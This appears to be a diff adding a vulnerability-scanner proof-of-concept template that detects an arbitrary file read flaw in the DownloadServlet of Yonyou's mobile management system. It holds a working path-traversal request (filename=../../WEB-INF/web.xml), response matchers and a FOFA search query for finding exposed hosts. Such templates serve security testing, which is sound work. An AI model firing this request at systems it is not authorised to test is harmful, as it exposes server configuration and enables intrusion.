@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-yidong-manager-system-downloadservlet-anyfile-read
+info:
+  name: 用友 移动管理系统 DownloadServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友 移动管理系统
+  fofa: app="用友-移动系统管理"
+requests:
+- method: GET
+  path: /servlet/~maportal/;/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"</web-app>") &&
+
+    contains(body,"<listener-class>") &&
+
+    contains(headers,"filename=web.xml")
+
+    '
+variables: {}
+transport: http
